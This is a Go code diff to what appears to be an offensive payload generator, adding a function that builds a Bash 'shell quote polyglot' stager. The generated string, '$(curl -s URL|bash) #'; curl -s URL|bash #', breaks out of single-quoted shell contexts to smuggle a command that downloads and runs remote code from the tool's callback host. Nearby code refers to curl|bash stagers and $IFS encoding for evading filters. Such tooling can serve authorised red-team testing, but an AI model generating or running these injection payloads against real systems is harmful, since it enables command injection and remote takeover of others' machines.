@@ -82,6 +82,9 @@ func (s *Stager) Generate() StagerPayload {
 		// Universal polyglot works for both single and double quote contexts
 		return s.GeneratePolyglot()
 	default:
+		if s.Context.Language == LangBash && s.Context.QuoteStyle == QuoteSingle {
+			return s.generateBashSingleQuotedStager()
+		}
 		// For bash contexts, check if we need $IFS encoding
 		if s.needsIFSEncoding() {
 			return s.generateIFSStager()
@@ -112,6 +115,20 @@ func (s *Stager) generateBashStager() StagerPayload {
 		KitchenPath: stagerurl.Path(s.ID),
 		CallbackURL: callbackURL,
 		Notes:       "Standard curl|bash stager. Requires curl in PATH.",
+	}
+}
+
+func (s *Stager) generateBashSingleQuotedStager() StagerPayload {
+	callbackURL := s.CallbackURL()
+	raw := fmt.Sprintf("$(curl -s %s|bash) #'; curl -s %s|bash #", callbackURL, callbackURL)
+
+	return StagerPayload{
+		Raw:         raw,
+		Context:     s.Context.Name,
+		Technique:   "curl_bash_shell_quote_polyglot",
+		KitchenPath: stagerurl.Path(s.ID),
+		CallbackURL: callbackURL,
+		Notes:       "Shell quote polyglot for Bash single-quoted contexts.",
 	}
 }
 
